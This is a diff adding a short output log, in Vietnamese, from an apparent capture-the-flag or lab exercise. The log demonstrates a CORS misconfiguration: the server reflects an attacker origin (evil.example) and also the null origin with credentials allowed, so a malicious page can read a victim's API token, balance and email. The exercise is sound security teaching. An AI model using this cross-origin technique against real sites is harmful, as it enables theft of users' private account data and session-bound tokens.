@@ -1,0 +1,16 @@
+[*] Buoc 1: nan nhan dang nhap victim app -> lay cookie session
+    set-cookie: session=sess-alice-abc123; HttpOnly; Path=/; SameSite=None
+
+[*] Buoc 2: gia lap trang ac doc /api/account (Origin: https://evil.example)
+    HTTP 200
+    Access-Control-Allow-Origin      = https://evil.example
+    Access-Control-Allow-Credentials = true
+    body (du lieu nan nhan)          = {'api_token': 'FLAG{9.3_cors_reflect_origin_with_credentials}', 'balance': '120,000,000 VND', 'email': 'alice@bank.local', 'username': 'alice'}
+    => server reflect origin ke tan cong + credentials: True
+    => trinh duyet se CHO evil.example doc body nay.
+
+[*] Buoc 3: thu Origin: null (iframe sandbox / redirect / file://)
+    ACAO = null ; ACAC = true
+    => chap nhan Origin null: True
+
+[+] Du lieu doc duoc cross-origin, flag: FLAG{9.3_cors_reflect_origin_with_credentials}
